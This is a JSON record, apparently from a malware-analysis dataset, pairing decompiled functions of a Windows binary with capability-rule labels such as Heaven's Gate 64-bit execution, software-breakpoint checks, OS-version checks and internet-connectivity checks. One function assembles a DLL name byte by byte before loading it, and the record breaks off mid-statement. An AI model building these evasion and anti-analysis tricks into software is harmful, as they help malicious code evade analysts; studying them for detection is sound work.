{
    "00403000": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00403000(void)\n\n{\n    *0x7fb169 = 0x6c;\n    *0x7fb163 = 0x6d;\n    *0x7fb162 = 0x69;\n    *0x7fb164 = 0x67;\n    *0x7fb168 = 100;\n    *0x7fb16b = 0;\n    *0x7fb165 = 0x33;\n    *0x7fb161 = 0x73;\n    *0x7fb16a = 0x6c;\n    *0x7fb167 = 0x2e;\n    *0x7fb166 = 0x32;\n    *0x7fb160 = 0x6d;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x7fb160);\n    return;\n}\n",
        "token_count": 193
    },
    "00403070": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00403070(uint32_t *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uchar auStack56 [4];\n    uint uStack52;\n    uchar auStack48 [48];\n    \n    if (*0x2f51b94 == 3) {\n        uStack52 = 0;\n        fcn.00409560(auStack48, 0, 0x30);\n        (*_sym.imp.KERNEL32.dll_GetDefaultCommConfigA)(0x402d24, &uStack52, auStack56);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(0, 0);\n    }\n    *param_1 = param_3 ^ param_2;\n    return;\n}\n",
        "token_count": 167
    },
    "0040c961": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c961(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040ce62;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040ca96;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040ca9d;\ncode_r0x0040ca96:\n                        do {\n                            var_4h = 1;\ncode_r0x0040ca9d:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040caab;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040caab:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x7f9df4 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x7f9df4 < iVar12) {\n                if (iVar12 < *0x7f9df0) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x7f9df0;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040ce62;\n            }\n            var_10h = *0x7f9df4 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040cc4e;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040cc4e:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040ce62:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3678
    },
    "0040cea5": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cea5(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040d3a6;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x7f9e10 - 1;\n        iVar4 = *0x7f9e10 + (*0x7f9e10 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x7f9e10 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040cfda;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040cfe1;\ncode_r0x0040cfda:\n                        do {\n                            var_4h = 1;\ncode_r0x0040cfe1:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040cfef;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040cfef:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x7f9e0c - *0x7f9e10) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x7f9e0c < iVar12) {\n                if (iVar12 < *0x7f9e08) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x7f9e1c;\n                    iVar4 = *0x7f9e14 + (*0x7f9e14 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x7f9e14 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x7f9e14 + (*0x7f9e14 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x7f9e14 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x7f9e1c + *0x7f9e08;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040d3a6;\n            }\n            var_10h = *0x7f9e0c - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x7f9e10 - 1;\n            iVar12 = *0x7f9e10 + (*0x7f9e10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x7f9e10 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040d192;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040d192:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x7f9e14 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040d3a6:\n    var_20h = iVar12 << (0x1fU - *0x7f9e14 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x7f9e18 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x7f9e18 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3703
    },
    "00404383": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404383(uint *param_1)\n\n{\n    *param_1 = 0x401240;\n    if (param_1[2] != 0) {\n        fcn.00404d1b(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0040680a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x004068fd: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00406902)\n// WARNING: Removing unreachable block (ram,0x00406930)\n// WARNING: Removing unreachable block (ram,0x00406908)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040680a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004069d0(0x7f7d10, 0x18);\n    fcn.00407f7e(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x7fa754 != 1) {\n        *0x7fa750 = 1;\n        *0x7fa74c = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00405fba(*0x2f535e8);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00405fba(*0x2f535e4);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00405fb1();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00405fba(*piVar2);\n                        iVar3 = fcn.00405fb1();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00405fba(*0x2f535e8);\n                        piVar1 = fcn.00405fba(*0x2f535e4);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00406744(0x4011f8);\n        }\n        fcn.00406744(0x401200);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00407ea4(8);\n    }\n    return;\n}\n",
        "token_count": 804
    },
    "004078b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004078b3(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x7f9b80) {\n        return;\n    }\n    *0x7fae58 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x7fae5c = &arg_8h;\n    *0x7fad98 = 0x10001;\n    *0x7fad40 = 0xc0000409;\n    *0x7fad44 = 1;\n    var_328h = *0x7f9b80;\n    var_324h = *0x7f9b84;\n    *0x7fad4c = unaff_retaddr;\n    *0x7fae24 = in_GS;\n    *0x7fae28 = in_FS;\n    *0x7fae2c = in_ES;\n    *0x7fae30 = in_DS;\n    *0x7fae34 = unaff_EDI;\n    *0x7fae38 = unaff_ESI;\n    *0x7fae3c = unaff_EBX;\n    *0x7fae40 = in_EDX;\n    *0x7fae44 = in_ECX;\n    *0x7fae48 = in_EAX;\n    *0x7fae4c = unaff_EBP;\n    *0x7fae50 = unaff_retaddr;\n    *0x7fae54 = in_CS;\n    *0x7fae60 = in_SS;\n    *0x7fad90 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040b36f(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x402514);\n    if 